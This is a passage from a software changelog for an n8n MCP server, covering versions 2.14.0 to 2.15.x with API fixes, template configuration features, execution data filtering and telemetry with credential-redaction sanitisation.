  - After: `Promise<Workflow>` (returns deleted workflow object)
  - Impact: Aligns with n8n API behavior where DELETE returns the deleted resource

### Changed
- **WorkflowListParams.tags** - Type changed for API compliance
  - Before: `tags?: string[] | null` (incorrect)
  - After: `tags?: string | null` (comma-separated string per n8n OpenAPI spec)
  - Impact: Type safety now matches actual API behavior

### Technical Details
- **API Compliance**: All fixes align with n8n OpenAPI specification
- **Backward Compatibility**: Handler maintains existing MCP tool interface (array input converted internally)
- **Type Safety**: TypeScript types now accurately reflect n8n API contracts

### Test Coverage
- Integration tests: 71/71 passing (Phase 1-5 complete)
- Total test scenarios across all phases: 87
- New coverage:
  - Workflow deletion: 3 scenarios
  - Workflow listing with filters: 13 scenarios

### Impact
- **DELETE workflows**: Now returns workflow data for verification
- **List with tags**: Tag filtering now functional (was broken before)
- **API alignment**: Implementation correctly matches n8n OpenAPI specification
- **Test reliability**: All integration tests passing in CI

## [2.15.4] - 2025-10-04

### Fixed
- **Workflow Settings Updates** - Enhanced `cleanWorkflowForUpdate` to enable settings updates while maintaining Issue #248 protection
  - Changed from always overwriting settings with `{}` to filtering to whitelisted properties
  - Filters settings to OpenAPI spec whitelisted properties: `saveExecutionProgress`, `saveManualExecutions`, `saveDataErrorExecution`, `saveDataSuccessExecution`, `executionTimeout`, `errorWorkflow`, `timezone`, `executionOrder`
  - Removes unsafe properties like `callerPolicy` that cause "additional properties" API errors
  - Maintains backward compatibility: empty object `{}` still used when no settings provided
  - Resolves conflict between preventing Issue #248 errors and enabling legitimate settings updates

- **Phase 4 Integration Tests** - Fixed workflow update tests to comply with n8n API requirements
  - Updated all `handleUpdateWorkflow` tests to include required fields: `name`, `nodes`, `connections`, `settings`
  - Tests now fetch current workflow state before updates to obtain required fields
  - Removed invalid "Update Connections" test that attempted to set empty connections on multi-node workflow (architecturally invalid)
  - All 42 workflow update test scenarios now passing

### Changed
- **Settings Filtering Strategy** - Updated `cleanWorkflowForUpdate()` implementation
  - Before: Always set `settings = {}` (prevented all settings updates)
  - After: Filter to whitelisted properties (allows valid updates, blocks problematic ones)
  - Impact: Users can now update workflow settings via API while staying protected from validation errors

### Technical Details
- **Whitelist-based Filtering**: Implements principle of least privilege for settings properties
- **Reference**: Properties validated against n8n OpenAPI specification `workflowSettings` schema
- **Security**: More secure than blacklist approach (fails safe, unknown properties filtered)
- **Performance**: Filtering adds <1ms overhead per workflow update

### Test Coverage
- Unit tests: 72/72 passing (100% coverage for n8n-validation)
- Integration tests: 433/433 passing (Phase 4 complete)
- Test scenarios:
  - Settings filtering with safe/unsafe property combinations
  - Empty settings handling
  - Backward compatibility verification
  - Multi-node workflow connection validation

### Impact
- **Settings Updates**: Users can now update workflow settings (timezone, executionOrder, etc.) via API
- **Issue #248 Protection Maintained**: `callerPolicy` and other problematic properties still filtered
- **Test Reliability**: All Phase 4 integration tests passing in CI
- **API Compliance**: Tests correctly implement n8n API requirements for workflow updates

## [2.15.3] - 2025-10-03

### Added
- **Error Message Capture in Telemetry** - Enhanced telemetry tracking to capture actual error messages for better debugging
  - Added optional `errorMessage` parameter to `trackError()` method
  - Comprehensive error message sanitization to protect sensitive data
  - Updated all production and test call sites to pass error messages
  - Error messages now stored in telemetry events table for analysis

### Security
- **Enhanced Error Message Sanitization** - Comprehensive security hardening for telemetry data
  - **ReDoS Prevention**: Early truncation to 1500 chars before regex processing
  - **Full URL Redaction**: Changed from `[URL]/path` to `[URL]` to prevent API structure leakage
  - **Correct Sanitization Order**: URLs → specific credentials → emails → generic patterns
  - **Credential Pattern Detection**: Added AWS keys, GitHub tokens, JWT, Bearer tokens
  - **Error Handling**: Try-catch wrapper with `[SANITIZATION_FAILED]` fallback
  - **Stack Trace Truncation**: Limited to first 3 lines to reduce attack surface

### Fixed
- **Missing Error Messages**: Resolved issue where 272+ weekly validation errors had no error messages captured
- **Data Leakage**: Fixed URL path preservation exposing API versions and user IDs
- **Email Exposure**: Fixed sanitization order allowing emails in URLs to leak
- **ReDoS Vulnerability**: Removed complex capturing regex patterns that could cause performance issues

### Changed
- **Breaking Change**: `trackError()` signature updated with 4th parameter `errorMessage?: string`
  - All internal call sites updated in single commit (atomic change)
  - Not backwards compatible but acceptable as all code is internal

### Technical Details
- **Sanitization Patterns**:
  - AWS Keys: `AKIA[A-Z0-9]{16}` → `[AWS_KEY]`
  - GitHub Tokens: `ghp_[a-zA-Z0-9]{36,}` → `[GITHUB_TOKEN]`
  - JWT: `eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+` → `[JWT]`
  - Bearer Tokens: `Bearer [^\s]+` → `Bearer [TOKEN]`
  - Emails: `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}` → `[EMAIL]`
  - Long Keys: `\b[a-zA-Z0-9_-]{32,}\b` → `[KEY]`
  - Generic Credentials: `password/api_key/token=<value>` → `<field>=[REDACTED]`

### Test Coverage
- Added 18 new security-focused tests
- Total telemetry tests: 269 passing
- Coverage: 90.75% for telemetry module
- All security patterns validated with edge cases

### Performance
- Early truncation prevents ReDoS attacks
- Simplified regex patterns (no complex capturing groups)
- Sanitization adds <1ms overhead per error
- Final message truncated to 500 chars max

### Impact
- **Debugging**: Error messages now available for root cause analysis
- **Security**: Comprehensive protection against credential leakage
- **Performance**: Protected against ReDoS attacks
- **Reliability**: Try-catch ensures sanitization never breaks telemetry

## [2.15.2] - 2025-10-03

### Fixed
- **Template Search Performance & Reliability** - Enhanced `search_templates_by_metadata` with production-ready improvements
  - **Ordering Stability**: Implemented CTE with VALUES clause to preserve exact Phase 1 ordering
    - Prevents ordering discrepancies between ID selection and data fetch phases
    - Ensures deterministic results across query phases
  - **Defensive ID Validation**: Added type safety filters before Phase 2 query
    - Validates only positive integers are used in the CTE
    - Logs warnings for filtered invalid IDs
  - **Performance Monitoring**: Added detailed timing metrics (phase1Ms, phase2Ms, totalMs)
    - Enables quantifying optimization benefits
    - Debug logging for all search operations
  - **DRY Refactoring**: Extracted `buildMetadataFilterConditions` helper method
    - Eliminates duplication between `searchTemplatesByMetadata` and `getMetadataSearchCount`
    - Centralized filter-building logic

### Added
- **Comprehensive Test Coverage** - 31 new unit tests achieving 100% coverage for changed code
  - `buildMetadataFilterConditions` - All filter combinations (11 tests)
  - Performance logging validation (3 tests)
  - ID filtering edge cases - negative, zero, non-integer, null (7 tests)
  - `getMetadataSearchCount` - Shared helper usage (7 tests)
  - Two-phase query optimization verification (3 tests)
- Fixed flaky integration tests with deterministic ordering using unique view counts

### Performance
- Query optimization maintains sub-1ms Phase 1 performance
- Two-phase approach prevents timeout on large template sets
- CTE-based ordering adds negligible overhead (<1ms)

### Test Results
- Unit tests: 31 new tests, all passing
- Integration tests: 36 passing, 1 skipped
- **Coverage**: 100% for changed code (previously 36.58% patch coverage)

## [2.15.0] - 2025-10-02

### 🚀 Major Features

#### P0-R3: Pre-extracted Template Configurations
- **Template-Based Configuration System** - 2,646 real-world node configurations from popular templates
  - Pre-extracted node configurations from all workflow templates
  - Ranked by template popularity (views)
  - Includes metadata: complexity, use cases, credentials, expressions
  - Query performance: <1ms (vs 30-60ms with previous system)
  - Database size increase: ~513 KB for 2,000+ configurations

### Breaking Changes

#### Removed: `get_node_for_task` Tool
- **Reason**: Only 31 hardcoded tasks, 28% failure rate in production
- **Replacement**: Template-based examples with 2,646 real configurations

#### Migration Guide

**Before (v2.14.7):**
```javascript
// Get configuration for a task
get_node_for_task({ task: "receive_webhook" })
```

**After (v2.15.0):**
```javascript
// Option 1: Search nodes with examples
search_nodes({
  query: "webhook",
  includeExamples: true
})
// Returns: Top 2 real template configs per node

// Option 2: Get node essentials with examples
get_node_essentials({
  nodeType: "nodes-base.webhook",
  includeExamples: true
})
// Returns: Top 3 real template configs with full metadata
```

### Added

- **Enhanced `search_nodes` Tool**
  - New parameter: `includeExamples` (boolean, default: false)
  - Returns top 2 real-world configurations per node from popular templates
  - Includes: configuration, template name, view count

- **Enhanced `get_node_essentials` Tool**
  - New parameter: `includeExamples` (boolean, default: false)
  - Returns top 3 real-world configurations with full metadata
  - Includes: configuration, source template, complexity, use cases, credentials info

- **Database Schema**
  - New table: `template_node_configs` - Pre-extracted node configurations
  - New view: `ranked_node_configs` - Easy access to top 5 configs per node
  - Optimized indexes for fast queries (<1ms)

- **Template Processing**
  - Automatic config extraction during `npm run fetch:templates`
  - Standalone extraction mode: `npm run fetch:templates:extract`
  - Expression detection ({{...}}, $json, $node)
  - Complexity analysis and use case extraction
  - Ranking by template popularity
  - Auto-creates `template_node_configs` table if missing

- **Comprehensive Test Suite**
  - 85+ tests covering all aspects of template configuration system
  - Integration tests for database operations and end-to-end workflows
  - Unit tests for tool parameters, extraction logic, and ranking algorithm
  - Fixtures for consistent test data across test suites
  - Test documentation in P0-R3-TEST-PLAN.md

### Removed

- Tool: `get_node_for_task` (see Breaking Changes above)
- Tool documentation: `get-node-for-task.ts`

### Fixed

- **`search_nodes` includeExamples Support**
  - Fixed `includeExamples` parameter not working due to missing FTS5 table
  - Added example support to `searchNodesLIKE` fallback method
  - Now returns template-based examples in all search scenarios
  - Affects 100% of search_nodes calls (database lacks nodes_fts table)

### Deprecated

- `TaskTemplates` service marked for removal in v2.16.0
- `list_tasks` tool marked for deprecation (use template search instead)

### Performance

- Query time: <1ms for pre-extracted configs (vs 30-60ms for on-demand generation)
- 30-60x faster configuration lookups
- 85x more configuration examples (2,646 vs 31)

## [2.14.7] - 2025-10-02

### Fixed
- **Issue #248: Settings Validation Error** - Fixed "settings must NOT have additional properties" API errors
  - Added `callerPolicy` property to `workflowSettingsSchema` to support valid n8n workflow setting
  - Implemented whitelist-based settings filtering in `cleanWorkflowForUpdate()` to prevent API errors
  - Filter removes UI-only properties (e.g., `timeSavedPerExecution`) that cause validation failures
  - Only whitelisted properties are sent to n8n API: `executionOrder`, `timezone`, `saveDataErrorExecution`, `saveDataSuccessExecution`, `saveManualExecutions`, `saveExecutionProgress`, `executionTimeout`, `errorWorkflow`, `callerPolicy`
  - Resolves workflow update failures caused by workflows fetched from n8n containing non-standard properties
  - Added 6 comprehensive unit tests covering settings filtering scenarios

- **Issue #249: Misleading AddConnection Error Messages** - Enhanced parameter validation with helpful error messages
  - Detect common parameter mistakes: using `sourceNodeId`/`targetNodeId` instead of correct `source`/`target`
  - Improved error messages include:
    - Identification of wrong parameter names with correction guidance
    - Examples of correct usage
    - List of available nodes when source/target not found
  - Error messages now actionable instead of cryptic (was: "Source node not found: undefined")
  - Added 8 comprehensive unit tests for parameter validation scenarios

- **P0-R1: Universal Node Type Normalization** - Eliminates 80% of validation errors
  - Implemented `NodeTypeNormalizer` utility for consistent node type handling
  - Automatically converts short forms to full forms (e.g., `nodes-base.webhook` → `n8n-nodes-base.webhook`)
  - Applied normalization across all workflow validation entry points
  - Updated workflow validator, handlers, and repository for universal normalization
  - Fixed test expectations to match normalized node type format
  - Resolves the single largest source of validation errors in production

### Added
- `NodeTypeNormalizer` utility class for universal node type normalization
  - `normalizeToFullForm()` - Convert any node type variation to canonical form
  - `normalizeWithDetails()` - Get normalization result with metadata
  - `normalizeWorkflowNodeTypes()` - Batch normalize all nodes in a workflow
- Settings whitelist filtering in `cleanWorkflowForUpdate()` with comprehensive null-safety
- Enhanced `validateAddConnection()` with proactive parameter validation
- 14 new unit tests for issues #248 and #249 fixes

### Changed
- Node repository now uses `NodeTypeNormalizer` for all lookups
- Workflow validation applies normalization before structure checks
- Workflow diff engine validates connection parameters before processing
- Settings filtering applied to all workflow update operations

### Performance
- No performance impact - normalization adds <1ms overhead per workflow
- Settings filtering is O(9) - negligible impact

### Test Coverage
- n8n-validation tests: 73/73 passing (100% coverage)
- workflow-diff-engine tests: 110/110 passing (89.72% coverage)
- Total: 183 tests passing

### Impact
- **Issue #248**: Eliminates ALL settings validation errors for workflows with non-standard properties
- **Issue #249**: Provides clear, actionable error messages reducing user frustration
- **P0-R1**: Reduces validation error rate by 80% (addresses 4,800+ weekly errors)
- Combined impact: Expected overall error rate reduction from 5-10% to <2%

## [2.14.6] - 2025-10-01

### Enhanced
- **Webhook Error Messages**: Replaced generic "Please try again later or contact support" messages with actionable guidance
  - Error messages now extract execution ID and workflow ID from failed webhook triggers
  - Guide users to use `n8n_get_execution({id: executionId, mode: 'preview'})` for efficient debugging
  - Format: "Workflow {workflowId} execution {executionId} failed. Use n8n_get_execution({id: '{executionId}', mode: 'preview'}) to investigate the error."
  - When no execution ID available: "Workflow failed to execute. Use n8n_list_executions to find recent executions, then n8n_get_execution with mode='preview' to investigate."

### Added
- New error formatting functions in `n8n-errors.ts`:
  - `formatExecutionError()` - Creates execution-specific error messages with debugging guidance
  - `formatNoExecutionError()` - Provides guidance when execution context unavailable
- Enhanced `McpToolResponse` type with optional `executionId` and `workflowId` fields
- Error handling documentation in `n8n-trigger-webhook-workflow` tool docs
- 30 new comprehensive tests for error message formatting and webhook error handling

### Changed
- `handleTriggerWebhookWorkflow` now extracts execution context from error responses
- `getUserFriendlyErrorMessage` returns actual server error messages instead of generic text
- Tool documentation type enhanced with optional `errorHandling` field

### Fixed
- Test expectations updated to match new error message format (handlers-workflow-diff.test.ts)

### Benefits
- **Fast debugging**: Preview mode executes in <50ms (vs seconds for full data)
- **Efficient**: Uses ~500 tokens (vs 50K+ tokens for full execution data)
- **Safe**: No timeout or token limit risks
- **Actionable**: Clear next steps for users to investigate failures

### Impact
- Eliminates unhelpful "contact support" messages
- Provides specific, actionable debugging guidance
- Reduces debugging time by directing users to efficient tools
- 100% backward compatible - only improves error messages

## [2.14.5] - 2025-09-30

### Added
- **Intelligent Execution Data Filtering**: Major enhancement to `n8n_get_execution` tool to handle large datasets without exceeding token limits
  - **Preview Mode**: Shows data structure, counts, and size estimates without actual data (~500 tokens)
  - **Summary Mode**: Returns 2 sample items per node (safe default, ~2-5K tokens)
  - **Filtered Mode**: Granular control with node filtering and custom item limits
  - **Full Mode**: Complete data retrieval (explicit opt-in)
  - Smart recommendations based on data size (guides optimal retrieval strategy)
  - Structure-only mode (`itemsLimit: 0`) to see data schema without values
  - Node-specific filtering with `nodeNames` parameter
  - Input data inclusion option for debugging transformations
  - Automatic size estimation and token consumption guidance

### Enhanced
- `n8n_get_execution` tool with new parameters:
  - `mode`: 'preview' | 'summary' | 'filtered' | 'full'
  - `nodeNames`: Filter to specific nodes
  - `itemsLimit`: Control items per node (0=structure, -1=unlimited, default=2)
  - `includeInputData`: Include input data for debugging
  - Legacy `includeData` parameter mapped to new modes for backward compatibility
- Tool documentation with comprehensive examples and best practices
- Type system with new interfaces: `ExecutionMode`, `ExecutionPreview`, `ExecutionFilterOptions`, `FilteredExecutionResponse`

### Technical Improvements
- New `ExecutionProcessor` service with intelligent filtering logic
- Smart data truncation with metadata (`hasMoreData`, `truncated` flags)
- Validation for `itemsLimit` (capped at 1000, negative values default to 2)
- Error message extraction helper for consistent error handling
- Constants-based thresholds for easy tuning (20/50/100KB limits)
- 33 comprehensive unit tests with 78% coverage
- Null-safe data access throughout

### Performance
- Preview mode: <50ms (no data, just structure)
- Summary mode: <200ms (2 items per node)
- Filtered mode: 50-500ms (depends on filters)
- Size estimation within 10-20% accuracy

### Impact
- Solves token limit issues when inspecting large workflow executions
- Enables AI agents to understand execution data without overwhelming responses
- Reduces token usage by 80-95% for large datasets (50+ items)
- Maintains 100% backward compatibility with existing integrations
- Recommended workflow: preview → recommendation → filtered/summary

### Fixed
- Preview mode bug: Fixed API data fetching logic to ensure preview mode retrieves execution data for structure analysis and recommendation generation
  - Changed `fetchFullData` condition in handlers-n8n-manager.ts to include preview mode
  - Preview mode now correctly returns structure, item counts, and size estimates
  - Recommendations are now accurate and prevent token overflow issues

### Migration Guide
- **No breaking changes**: Existing `n8n_get_execution` calls work unchanged
- New recommended workflow:
  1. Call with `mode: 'preview'` to assess data size
  2. Follow `recommendation.suggestedMode` from preview
  3. Use `mode: 'filtered'` with `itemsLimit` for precise control
- Legacy `includeData: true` now maps to `mode: 'summary'` (safer default)

## [2.14.4] - 2025-09-30

### Added
- **Workflow Cleanup Operations**: Two new operations for `n8n_update_partial_workflow`
  - `cleanStaleConnections`: Automatically removes connections referencing non-existent nodes
  - `replaceConnections`: Replace entire connections object in a single operation
- **Graceful Error Handling**: Enhanced `removeConnection` with `ignoreErrors` flag
- **Best-Effort Mode**: New `continueOnError` mode for `WorkflowDiffRequest`
  - Apply valid operations even if some fail
  - Returns detailed results with `applied` and `failed` operation indices
  - Maintains atomic mode as default for safety

### Enhanced
- Tool documentation for workflow cleanup scenarios
- Type system with new operation interfaces
- 15 new tests covering all new features

### Impact
- Reduces broken workflow fix time from 10-15 minutes to 30 seconds
- Token efficiency: `cleanStaleConnections` is 1 operation vs 10+ manual operations
- 100% backwards compatibility maintained

## [2.14.3] - 2025-09-30

### Added
- Incremental template updates with `npm run fetch:templates:update`
- Smart filtering for new templates (5-10 min vs 30-40 min full rebuild)
- 48 new templates (2,598 → 2,646 total)

### Fixed
- Template metadata generation: Updated to `gpt-4o-mini-2025-08-07` model
- Removed unsupported `temperature` parameter from OpenAI Batch API
- Template sanitization: Added Airtable PAT and GitHub token detection
- Sanitized 24 templates removing API tokens

### Updated
- n8n: 1.112.3 → 1.113.3
- n8n-core: 1.111.0 → 1.112.1
- n8n-workflow: 1.109.0 → 1.110.0
- @n8n/n8n-nodes-langchain: 1.111.1 → 1.112.2
- Node database rebuilt with 536 nodes from n8n v1.113.3

## [2.14.2] - 2025-09-29

### Fixed
- Validation false positives for Google Drive nodes with 'fileFolder' resource
  - Added node type normalization to handle both `n8n-nodes-base.` and `nodes-base.` prefixes correctly
  - Fixed resource validation to properly recognize all valid resource types
  - Default operations are now properly applied when not specified
  - Property visibility is now correctly checked with defaults applied
- Code node validation incorrectly flagging valid n8n expressions as syntax errors
  - Removed overly aggressive regex pattern `/\)\s*\)\s*{/` that flagged valid expressions
  - Valid patterns like `$('NodeName').first().json` are now correctly recognized
  - Function chaining and method chaining no longer trigger false positives
- Enhanced error handling in repository methods based on code review feedback
  - Added try-catch blocks to `getNodePropertyDefaults` and `getDefaultOperationForResource`
  - Validates data structures before accessing to prevent crashes with malformed node data
  - Returns safe defaults on errors to ensure validation continues

### Added
- Comprehensive test coverage for validation fixes in `tests/unit/services/validation-fixes.test.ts`
- New repository methods for better default value handling:
  - `getNodePropertyDefaults()` - retrieves default values for node properties
  - `getDefaultOperationForResource()` - gets default operation for a specific resource

### Changed
- Enhanced `filterPropertiesByMode` to return both filtered properties and config with defaults applied
- Improved node type validation to accept both valid prefix formats

## [2.14.1] - 2025-09-26

### Changed
- **BREAKING**: Refactored telemetry system with major architectural improvements
  - Split 636-line TelemetryManager into 7 focused modules (event-tracker, batch-processor, event-validator, rate-limiter, circuit-breaker, workflow-sanitizer, config-manager)
  - Changed TelemetryManager constructor to private, use `getInstance()` method now
  - Implemented lazy initialization pattern to avoid early singleton creation

### Added
- Security & Privacy enhancements for telemetry:
  - Comprehensive input validation with Zod schemas
  - Enhanced sanitization of sensitive data (URLs, API keys, emails)
  - Expanded sensitive key detection patterns (25+ patterns)
  - Row Level Security on Supabase backend
  - Data deletion contact info (romuald@n8n-mcp.com)
- Performance & Reliability improvements:
  - Sliding window rate limiter (100 events/minute)
  - Circuit breaker pattern for network failures
  - Dead letter queue for failed events
  - Exponential backoff with jitter for retries
  - Performance monitoring with overhead tracking (<5%)
  - Memory-safe array limits in rate limiter
- Comprehensive test coverage enhancements:
  - Added 662 lines of new telemetry tests
  - Enhanced config-manager tests with 17 new edge cases
  - Enhanced workflow-sanitizer tests with 19 new edge cases
  - Improved coverage from 63% to 91% for telemetry module
  - Branch coverage improved from 69% to 87%

### Fixed
- TypeScript lint errors in telemetry test files
  - Corrected variable name conflicts in integration tests
  - Fixed process.exit mock implementation in batch-processor tests
  - Fixed tuple type annotations for workflow node positions
  - Resolved MockInstance type import issues
- Test failures in CI pipeline
  - Fixed test timeouts caused by improper fake timer usage
  - Resolved Timer.unref() compatibility issues
  - Fixed event validator filtering standalone 'key' property
  - Corrected batch processor circuit breaker behavior
- TypeScript error in telemetry test preventing CI build
- Added @supabase/supabase-js to Docker builder stage and runtime dependencies

## [2.14.0] - 2025-09-26

### Added
- Anonymous telemetry system with Supabase integration to understand usage patterns
  - Tracks active users with deterministic anonymous IDs
  - Records MCP tool usage frequency and error rates
  - Captures sanitized workflow structures on successful validation
  - Monitors common error patterns for improvement insights
  - Zero-configuration design with opt-out support via N8N_MCP_TELEMETRY_DISABLED environment variable

- Enhanced telemetry tracking methods:
  - `trackSearchQuery` - Records search patterns and result counts
  - `trackValidationDetails` - Captures validation errors and warnings
  - `trackToolSequence` - Tracks AI agent tool usage sequences
  - `trackNodeConfiguration` - Records common node configuration patterns
  - `trackPerformanceMetric` - Monitors operation performance

- Privacy-focused workflow sanitization:
  - Removes all sensitive data (URLs, API keys, credentials)
  - Generates workflow hashes for deduplication
  - Preserves only structural information

- Comprehensive test coverage for telemetry components (91%+ coverage)

### Fixed
- Fixed TypeErrors in `get_node_info`, `get_node_essentials`, and `get_node_documentation` tools that were affecting 50% of calls
- Added null safety checks for undefined node properties
- Fixed multi-process telemetry issues with immediate flush strategy
- Resolved RLS policy and permission issues with Supabase

### Changed
- Updated Docker configuration to include Supabase client for telemetry support
- Enhanced workflow validation tools to track validated workflows
- Improved error handling with proper null coalescing operators

### Documentation
- Added PRIVACY.md with comprehensive privacy policy
- Added telemetry configuration instructions to README
- Updated CLAUDE.md with telemetry system architecture

## Previous Versions

For changes in previous versions, please refer to the git history and release notes.